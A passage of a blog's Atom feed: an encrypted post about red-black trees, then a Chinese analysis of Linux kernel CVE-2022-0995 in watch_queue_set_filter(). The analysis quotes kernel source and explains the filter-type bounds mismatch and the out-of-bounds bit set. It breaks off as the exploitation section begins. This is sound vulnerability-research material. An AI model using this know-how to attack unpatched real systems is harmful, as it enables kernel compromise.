c7c4bb970bad8c177550143990b1569f386f86022b926af2d5db3c116bd21aa5a0299db914e7b65223630847d280847ca40cf029978d6c0f40c896d5a6c12226d73132bfc12824405b7a8a661753b8b8d5323a643021d23de569f972e70db9497e00578c92f02efd6ab377894cc162673b62441563bb38171cf99fa08fc5b567e2e2d7a163ef6150ffc82ab78ae0710ef08e5cfc48b70a0c90404902d9950ade578afdb584f179d9418c947d8d0c6834822ef96b23e6ea83848e5773ded7e0e7a85ea2fabba4d0cb988b2dd3b03ed20374f7209238d1bff8c3c8d33049307e7ea112a73452ecca580f7cb0a2f58c48e7407be4619e185aa0fc9f9af8d9853cab08f06a95cc6789fd32e064e9a2948c4e7dab44544c63855b73b8447ee0b0431cd899cbe093962dea7d63dc6153d7f6485bd46d771c68c75145ed578693b6a49b0c59a204cbd07fd091c15743a4b6cdb6b68ba8627bd198e72d0eb0d9adc9ee6a080b299a229834945b26f66e7d54fec584e678acc67940e5425fe409a7bd5e1fdfa2b8cd4d0af7384242809f2ac06ae09a5146f7cf74a9f60cc20df1c2d47fa80c3aafdcf35d0a05f7025391d4468fb14efd8a390704aaaa903a7dc8576c81e8a3406bf1673ebb9dccebccaa10cd2b9dc2c70931ff446902190634fefa85b4ae91f6fae264c73c9ad6879df7d6371a30098444ec3e221610343b822ff290dac9998610c30891595f2a70aa0374002d75573c303a82f7a3a21eaa2e98325a9ff8764083c6fcc5ea8b84a577ca56c92f3759f5a64f2ee9e17de81c38b07648a84cbac63f80ff5a6eddc2a28c8ff71c4ffe72ce7797bacd5955a815b20752f4c3670a38ca1bd01b51d647265a1a93e25e2fef85ceca03f248bd8bef1f5e220592f539ce80b8d8afdc2b9782b1c69b90ebbc58e33f8aab2a7c2ee13e3921c79508bbe19402adf0c87ebe310813db14ba8713a49802479b8014291691c37181e6713ed5e3ffc454e5479be58eacad603bc61e074bada48d201b68857f73b6f978cdb8115dc96693052bb735ffe2941fde9937c07ba9fe6f97057e60a8a6816761e4f9f293ed8978df2f8cbb27061bab67185c84d93e3afb8dd2a7f247e32185fa48fa33bcff9f37e0c6bd99d26c0c585842fae5da8974122336bacf3c8a57ea00d0474fe0991ad3c3afb8a31bff0027216eaffa4b3227cda82b2840190649fd4d36f0e0dd38e46b1a25a914b468fd6e46256d0e5f0e4c3e7499d5c3a2616165a2aa77bbd9f02539db57861c723f136338662ee512eaf59cf8f6beb61d45a95dd41c27288c36f7634bd6afe13a646bd05015e02b7e0fd465150311d215f8ee351796bbfdad49cdaf6beebfc8d04f929805be35667daeab146fc8d155b26ac26e18a816581c9e6585a03bbf268fa1fb67f22a3d160dc75512ec7787e9f15da282127bf2d06f8e0556ada99aa908fb14d93f164c08a0fafa730dee1d61c016fb30e02fd81b5fcbcb0e08ae50022c67e6857e406769d1311db81789fb9ff60f15a2bc1e9da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">面试官：听说你算法还行，来给👴简单手写个红黑树就让你过了</summary>
    
    
    
    <category term="ALGORITHM" scheme="http://blog.arttnba3.cn/categories/ALGORITHM/"/>
    
    
    <category term="C&amp;C++" scheme="http://blog.arttnba3.cn/tags/C-C/"/>
    
    <category term="Algorithm" scheme="http://blog.arttnba3.cn/tags/Algorithm/"/>
    
    <category term="Tree" scheme="http://blog.arttnba3.cn/tags/Tree/"/>
    
    <category term="Binary Search Tree" scheme="http://blog.arttnba3.cn/tags/Binary-Search-Tree/"/>
    
    <category term="AVL Tree" scheme="http://blog.arttnba3.cn/tags/AVL-Tree/"/>
    
    <category term="Red-Black Tree" scheme="http://blog.arttnba3.cn/tags/Red-Black-Tree/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x08】CVE-2022-0995 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/"/>
    <id>http://blog.arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/</id>
    <published>2022-04-06T04:24:09.000Z</published>
    <updated>2022-04-06T04:40:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>我在看着你👁_👁</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0995 是近日爆出来的一个存在于 _观察队列事件通知子系统_（watch_queue event notification subsystem）中的一个堆溢出漏洞，该漏洞自内核版本 <code>5.8</code> 中伴随着 watch queue subsystem 引入，在 <code>5.17-rc7</code> 版本中被修复</p><p>不过虽然获得了 <code>7.1</code> 的 CVSS 评分，但这个漏洞似乎并没有什么热度，不过在笔者看来这仍然是一个品相不错的漏洞</p><p>在开始之前我们先来补充一些基础知识</p><h2 id="General-notification-mechanism"><a href="#General-notification-mechanism" class="headerlink" title="General notification mechanism"></a><em>General notification mechanism</em></h2><blockquote><p>参见<a href="https://www.kernel.org/doc/html/latest/watch_queue.html">https://www.kernel.org/doc/html/latest/watch_queue.html</a></p></blockquote><p><em>通用通知机制</em> 是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 <code>CONFIG_WATCH_QUEUE</code> 编译选项启用（默认开启）</p><p>该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（<code>pipe_buffer</code> 队列），通过 <code>read()</code> 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）</p><p>管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道</p><p>若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 <code>pipe_buffer</code> ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，<code>read()</code> 将在读取当前缓冲区的最后一条消息后将 <code>WATCH_META_LOSS_NOTIFICATION</code> 插入输出缓冲区</p><h3 id="Watch-Queue（Notification-Output）API"><a href="#Watch-Queue（Notification-Output）API" class="headerlink" title="Watch Queue（Notification Output）API"></a>Watch Queue（Notification Output）API</h3><p>一个 <em>观测队列</em> （watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>该函数用以丢弃从 <code>get_watch_queue()</code> 获得的引用</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>当一个观测队列被创建后，我们可以应用一组 <em>过滤器</em> （filters）以限制接收的事件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>其中 filter 应为一个 <code>struct watch_notification_filter</code> 类型变量，其中 <code>nr_filters</code> 表示 <code>filters[]</code> 数组中过滤器的数量，而 <code>__reserved</code> 应为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">        __u32   nr_filters;</span><br><span class="line">        __u32   __reserved;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>filters[]</code> 为一个 <code>watch_notification_type_filter</code> 类型的结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">        __u32   type;</span><br><span class="line">        __u32   info_filter;</span><br><span class="line">        __u32   info_mask;</span><br><span class="line">        __u32   subtype_filter[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><code>type</code> 为要过滤的事件类型，应当为类似 <code>WATCH_TYPE_KEY_NOTIFY</code> 的值</p></li><li><p><code>info_filter</code> 与 <code>info_mask</code> 充当通知记录的信息字段的过滤器，仅在以下情况才将通知写入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p>例如，这可以用于忽略不在一个挂载树上的观测点的事件</p></li><li><p><code>subtype_filter</code> 为一个指示我们感兴趣的子类型的 bitmask，<code>subtype_filter[0]</code> 的 0 位对应子类型 0，1 位对应子类型 1，以此类推</p></li></ul><p>若 ioctl() 的参数为 NULL，则过滤器将被移除，我们将接收到所有来自观测源的事件</p><h2 id="内核中-watch-queue-subsystem-中-Event-Filter-的实现"><a href="#内核中-watch-queue-subsystem-中-Event-Filter-的实现" class="headerlink" title="内核中 watch queue subsystem 中 Event Filter 的实现"></a>内核中 watch queue subsystem 中 Event Filter 的实现</h2><p>前面我们抄了一大段的 kernel document，现在我们来深入源码看一下 watch queue subsystem 的实现机制</p><p>当我们调用 <code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</code> 时，会调用 <code>do_vfs_ioctl()</code> 判断 cmd 进行处理，而我们的 <code>IOC_WATCH_QUEUE_SET_FILTER</code> 不在其列表中，所以最后会走到 <code>vfs_ioctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, cmd, <span class="type">unsigned</span> <span class="type">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>vfs_ioctl()</code> 中会调用 file 结构体自身的函数表中的 <code>unlocked_ioctl</code> 指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>那么这里我们需要将目光放回管道的创建流程中分配文件描述符的部分，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">    __do_pipe_flags()</span><br><span class="line">    create_pipe_files()</span><br><span class="line">    alloc_file_pseudo()</span><br><span class="line">    alloc_file()</span><br></pre></td></tr></table></figure><p><code>alloc_file()</code> 分配一个 file 结构体并将其函数表设为上层调用传入的函数表，而在 <code>create_pipe_files()</code> 中传入的函数表为 <code>pipefifo_fops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因此最终调用到的是 <code>pipe_ioctl()</code>，对于 cmd <code>IOC_WATCH_QUEUE_SET_FILTER</code> 而言，最终会调用 <code>watch_queue_set_filter()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">pipe_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="type">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (<span class="keyword">struct</span> watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>漏洞便发生在 <code>watch_queue_set_filter()</code>中将 filter 数组从用户空间拷贝到内核空间的过程当中，现在让我们仔细审视这个函数的执行流程，在一开始时首先会将用户空间的 <code>watch_notification_filter</code> 结构拷贝到内核空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">watch_queue_set_filter</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> watch_notification_filter __user *_filter)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="type">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>之后 <code>memdup_user()</code> 分配一块临时空间，将用户空间的 filter 数组拷贝至该临时空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br></pre></td></tr></table></figure><p>接下来会遍历每一个 <code>watch_notification_type_filter</code> 结构，记录 type 在指定范围的 filter 的数量到变量 <code>nr_filter</code> 中，这里其判断一个 type 是否合法的范围是 <code>sizeof(wfilter-&gt;type_filter) * 8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来会分配真正储存 filter 的的空间，这里用了一个 <code>struct_size()</code> 导出的大小为 <code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>（感兴趣的同学可以自行阅读源码），注意到这里计算大小用的是我们前面遍历计算得到的 <code>nr_filter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br></pre></td></tr></table></figure><p>之后是将 filter 数组拷贝到分配的空间上，<strong>我们的第一个漏洞便出现在这里，其判断 type 是否合法使用的是</strong> <code>sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</code> ，<strong>与前面 nr_filter 的计算存在不一致性</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 <code>BITS_PER_LONG</code> 定义于 <code>/include/asm-generic/bitsperlong.h</code> 中，<strong>在 32 位下为 32，64 位下为64</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br></pre></td></tr></table></figure><p>那么前后对 type 范围的计算便存在不一致，我们不难想到的是<strong>我们可以指定几个 filter 的 type 为（计算 nr_filter 时的合法 type 上限值，拷贝 filter 时的合法 type 上限值）这个范围内的特定值，这样就能越界拷贝一定数量的 filter，从而完成堆上的越界写</strong></p><p>那么这里我们容易计算得出触发第一个漏洞的 type 的范围应为 <code>[0x80, 0x400)</code></p><p>而<strong>第二个漏洞则存在于上面这段代码中对</strong> <code>__set_bit()</code> <strong>的调用，该函数定义如下：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __set_bit(<span class="type">int</span> nr, <span class="keyword">volatile</span> <span class="type">unsigned</span> <span class="type">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p = ((<span class="type">unsigned</span> <span class="type">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其作用便是<strong>将 addr 偏移 BIT_WORD(nr) 处的 BIT_MASK(mask) 位进行置 1 操作</strong>，这里的 <code>BIT_WORD()</code> 宏主要是除以 long 类型所占位数（64），而 <code>BIT_MASK()</code> 宏则是对 long 类型所占位数求模后结果作为 unsigned long 值 1 左移的位数导出结果数值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br></pre></td></tr></table></figure><p>而传入的第一个参数刚好为 type，由于我们的 type 可以在 <code>[0x80, 0x400)</code> 范围内取，<strong>而分配的 filter 空间却未必有那么大，因此这里存在一个越界置 1 位的漏洞，我们可以通过设置一个较大的 type 完成堆上越界置 1 位的操作</strong></p><p>例如对于 <code>kmalloc-96</code> 而言，我们的对象可以覆盖到下图所示范围（本图来自于 <a href="https://blog.csdn.net/Breeze_CAT/article/details/123845526">breezeO_o师傅的博客</a>）：</p><p><img src="https://s2.loli.net/2022/04/06/KZAFrduvUizs4Dg.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>在<a href="https://github.com/Bonfee/CVE-2022-0995">目前公开的 exp</a> 中对该漏洞的利用其实是基于 <code>__set_bit()</code> 进行利用的，因为相较于不好控制的 filter 溢出，越界写 